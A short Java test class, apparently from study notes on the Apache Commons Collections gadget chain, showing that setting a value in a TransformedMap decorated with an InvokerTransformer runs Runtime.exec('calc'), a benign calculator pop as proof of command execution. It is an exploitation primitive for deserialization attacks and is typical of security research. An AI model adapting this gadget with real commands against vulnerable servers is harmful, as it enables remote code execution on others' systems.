package TransformMapCC;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

// setValue 调用弹计算器
public class SetValueTest {
    public static void main(String[] args) {
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("key", "value");
        Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        for (Map.Entry entry:decorateMap.entrySet()){
            entry.setValue(runtime);
        }
    }
}
